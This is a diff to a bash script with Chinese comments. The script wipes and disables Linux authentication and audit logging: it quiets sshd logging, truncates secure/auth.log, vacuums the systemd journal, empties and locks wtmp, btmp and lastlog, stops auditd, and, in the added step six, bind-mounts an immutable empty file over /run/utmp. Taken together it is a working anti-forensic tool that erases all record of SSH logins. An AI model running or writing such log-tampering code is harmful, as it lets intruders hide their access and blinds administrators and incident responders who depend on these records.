@@ -30,6 +30,7 @@ if ! sshd -t; then
   exit 1
 fi
 echo "[1/6] 已设置 sshd LogLevel 为 QUIET"
+echo
 
 # 2. 拦截 rsyslog 写入 secure / auth.log
 if [ -d /etc/rsyslog.d ]; then
@@ -42,6 +43,7 @@ fi
 [ -f /var/log/secure ] && truncate -s 0 /var/log/secure
 [ -f /var/log/auth.log ] && truncate -s 0 /var/log/auth.log
 echo "[2/6] 已拦截并清空传统文本认证日志"
+echo
 
 # 3. 禁用 systemd-journald 新日志，并彻底清除历史 journal 归档
 SYSTEMD_DIR="/etc/systemd/system/${SSH_SERVICE}.service.d"
@@ -60,6 +62,7 @@ systemctl restart "$SSH_SERVICE"
 journalctl --rotate
 journalctl --vacuum-time=1s >/dev/null 2>&1
 echo "[3/6] 已阻断并清空 systemd-journald 历史记录"
+echo
 
 # 4. 清空并屏蔽 wtmp / btmp / lastlog（针对 last 和 lastb）
 for bin_log in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
@@ -71,6 +74,7 @@ for bin_log in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
   fi
 done
 echo "[4/6] 已清空并锁定 wtmp / btmp / lastlog（last 与 lastb 将为空）"
+echo
 
 # 5. 停止并禁用 auditd 内核审计日志（针对 ausearch）
 if command -v auditctl >/dev/null 2>&1 || systemctl list-unit-files | grep -q "^auditd.service"; then
@@ -85,6 +89,18 @@ if command -v auditctl >/dev/null 2>&1 || systemctl list-unit-files | grep -q "^
 else
   echo "[5/6] 系统未安装 auditd，跳过审计配置"
 fi
+echo
+
+# 6. 清空并屏蔽 utmp 登录记录
+# 创建一个空的只读占位文件（位于支持 chattr 的磁盘分区上）
+sudo touch /etc/empty_utmp
+sudo chattr +i /etc/empty_utmp
+# 先清空现有的内存 utmp
+sudo truncate -s 0 /run/utmp
+# 使用 bind mount 将只读空文件强行覆盖挂载到 /run/utmp 上
+sudo mount --bind /etc/empty_utmp /run/utmp
+echo "[6/6] 已清空 utmp 并挂载 empty_utmp 占位文件"
+echo
 
 echo "=== ✅ 全部清理与禁用操作已完成 ==="
 EOF
